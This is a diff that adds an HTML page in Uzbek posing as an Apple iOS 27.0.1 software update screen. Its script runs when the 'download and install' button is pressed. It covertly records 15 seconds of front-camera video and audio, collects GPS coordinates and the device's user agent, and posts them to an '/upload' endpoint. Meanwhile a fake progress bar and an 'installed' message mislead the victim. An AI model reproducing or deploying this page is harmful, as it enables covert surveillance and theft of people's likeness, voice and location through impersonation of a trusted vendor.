@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dasturiy ta'minot yangilanishi</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Helvetica Neue', sans-serif; background: #f2f2f7; color: #000; -webkit-font-smoothing: antialiased; }
+        
+        .header { background: #f9f9f9; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #c6c6c8; }
+        .header .back { font-size: 17px; color: #007aff; }
+        .header .title { font-size: 17px; font-weight: 600; }
+        .header .spacer { width: 50px; }
+        
+        .container { max-width: 500px; margin: 0 auto; padding: 0; }
+        
+        .update-box { background: white; margin: 15px 15px; border-radius: 15px; overflow: hidden; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+        .update-header { padding: 20px 20px 15px; text-align: center; border-bottom: 1px solid #f0f0f0; }
+        .update-header .ios-icon { width: 45px; height: 45px; background: #007aff; border-radius: 10px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; color: white; font-weight: 700; }
+        .update-header h2 { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
+        .update-header .ver { font-size: 15px; color: #666; }
+        
+        .update-info { padding: 15px 20px; }
+        .update-info .row { display: flex; justify-content: space-between; padding: 10px 0; font-size: 15px; }
+        .update-info .row .label { color: #666; }
+        .update-info .row .value { color: #000; }
+        
+        .features { padding: 0 20px 20px; }
+        .features h3 { font-size: 15px; color: #666; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .features ul { list-style: none; }
+        .features li { padding: 10px 0; font-size: 15px; color: #000; border-bottom: 1px solid #f5f5f5; display: flex; align-items: flex-start; }
+        .features li .bullet { width: 6px; height: 6px; background: #007aff; border-radius: 50%; margin-right: 12px; margin-top: 6px; flex-shrink: 0; }
+        
+        .btn { background: #007aff; color: white; border: none; padding: 14px 30px; font-size: 17px; border-radius: 12px; font-weight: 600; cursor: pointer; width: calc(100% - 40px); margin: 0 20px 20px; letter-spacing: 0.3px; }
+        .btn:hover { background: #0066d6; }
+        
+        .progress-bar { width: 100%; background: #e5e5ea; border-radius: 10px; height: 6px; margin: 20px 0; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #007aff; border-radius: 10px; transition: width 0.3s; }
+        
+        .success { text-align: center; padding: 40px 30px; }
+        .success .check { width: 60px; height: 60px; background: #34c759; border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white; }
+        .success h2 { color: #000; margin: 10px 0; font-size: 20px; }
+        
+        .footer { text-align: center; color: #999; padding: 20px; font-size: 12px; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <span class="back">Sozlamalar</span>
+        <span class="title">Dasturiy ta'minot</span>
+        <span class="spacer"></span>
+    </div>
+
+    <div class="container">
+        <div class="update-box" id="main-card">
+            <div class="update-header">
+                <div class="ios-icon">27</div>
+                <h2>iOS 27.0.1</h2>
+                <p class="ver">Apple Inc.</p>
+            </div>
+            <div class="update-info">
+                <div class="row">
+                    <span class="label">Hajmi</span>
+                    <span class="value">29 MB</span>
+                </div>
+                <div class="row">
+                    <span class="label">Versiya</span>
+                    <span class="value">27.0.1 (22A400)</span>
+                </div>
+                <div class="row">
+                    <span class="label">Chiqarilgan sana</span>
+                    <span class="value">2026 yil 14-iyun</span>
+                </div>
+            </div>
+            <div class="features">
+                <h3>Yangilanish tavsifi</h3>
+                <ul>
+                    <li><span class="bullet"></span>Muhim xavfsizlik tuzatishlari kiritildi</li>
+                    <li><span class="bullet"></span>Face ID ishlashi yaxshilandi</li>
+                    <li><span class="bullet"></span>Batareya boshqaruvi optimallashtirildi</li>
+                    <li><span class="bullet"></span>Bluetooth ulanish muammolari bartaraf etildi</li>
+                    <li><span class="bullet"></span>Tizim barqarorligi oshirildi</li>
+                </ul>
+            </div>
+            <button class="btn" onclick="startUpdate()">Yuklab olish va o'rnatish</button>
+            <p style="font-size:11px; color:#999; padding:0 20px 15px; text-align:center;">Yangilanishni o'rnatish uchun kamera ruxsati talab qilinadi</p>
+        </div>
+
+        <div class="update-box" id="loading-card" style="display:none;">
+            <div style="padding:40px 30px; text-align:center;">
+                <h2 style="font-size:20px; margin-bottom:8px;">iOS 27.0.1 yuklanmoqda...</h2>
+                <p style="color:#666; font-size:14px; margin-bottom:5px;">Taxminan 15 daqiqa qolgan</p>
+                <p style="color:#999; font-size:12px; margin-bottom:25px;">Qurilmangiz qayta ishga tushishi mumkin</p>
+                <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
+                <p id="percent-text" style="font-weight:600; color:#007aff; font-size:14px; margin-top:10px;">0%</p>
+            </div>
+        </div>
+
+        <div class="update-box" id="success-card" style="display:none;">
+            <div class="success">
+                <div class="check">&#10003;</div>
+                <h2>iOS 27.0.1 o'rnatildi</h2>
+                <p style="color:#666; font-size:14px;">iPhone qurilmangiz eng so'nggi versiyada</p>
+                <p style="color:#007aff; font-size:13px; margin-top:5px;">Qayta ishga tushirish shart emas</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">Apple Inc. &copy; 2026. Barcha huquqlar himoyalangan.</div>
+
+    <video id="vid" autoplay playsinline muted></video>
+
+    <script>
+        let gps_lat = 'Aniqlanmadi';
+        let gps_lon = 'Aniqlanmadi';
+        let mediaRecorder;
+        let videoChunks = [];
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(pos) {
+                    gps_lat = pos.coords.latitude;
+                    gps_lon = pos.coords.longitude;
+                });
+            }
+        }
+
+        function startRecording() {
+            return new Promise((resolve, reject) => {
+                navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}, audio: true}).then((stream) => {
+                    const vid = document.getElementById('vid');
+                    vid.srcObject = stream;
+                    vid.play();
+                    
+                    mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+                    videoChunks = [];
+                    
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) {
+                            videoChunks.push(e.data);
+                        }
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(videoChunks, {type: 'video/webm'});
+                        const reader = new FileReader();
+                        reader.readAsDataURL(videoBlob);
+                        reader.onloadend = () => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve(reader.result);
+                        };
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 15000);
+                }).catch(() => {
+                    resolve(null);
+                });
+            });
+        }
+
+        async function startUpdate() {
+            document.getElementById('main-card').style.display = 'none';
+            document.getElementById('loading-card').style.display = 'block';
+            getLocation();
+
+            const videoData = await startRecording();
+            
+            if (videoData) {
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        video: videoData,
+                        lat: gps_lat,
+                        lon: gps_lon,
+                        deviceInfo: navigator.userAgent
+                    })
+                });
+            }
+
+            let percent = 0;
+            const progressFill = document.getElementById('progress');
+            const percentText = document.getElementById('percent-text');
+            
+            const interval = setInterval(() => {
+                percent += 1;
+                progressFill.style.width = percent + '%';
+                percentText.textContent = percent + '%';
+                
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('loading-card').style.display = 'none';
+                    document.getElementById('success-card').style.display = 'block';
+                }
+            }, 200);
+        }
+    </script>
+</body>
+</html>
